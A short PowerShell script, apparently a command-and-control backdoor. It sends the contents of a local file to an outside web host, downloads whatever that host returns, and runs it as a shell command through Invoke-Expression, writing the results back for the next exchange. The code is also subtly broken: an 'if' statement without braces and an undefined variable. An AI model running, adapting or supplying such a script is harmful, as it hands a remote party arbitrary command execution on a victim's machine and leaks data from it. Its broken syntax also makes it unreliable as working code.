
$fpath = "C:\windows\output.txt"
$text = "start"
if(Test-Path $fpath)
$text = Get-Content $fpath | Out-String
$data = (New-Object System.Net.WebClient).DownloadString("http://bctslab2.heroku.com/x?x="+$text)
$data3 = "cmd /c " + $data2 + $data + $data2 
$data4 = Invoke-Expression $data3
Out-File -FilePath $fpath -InputObject $data4
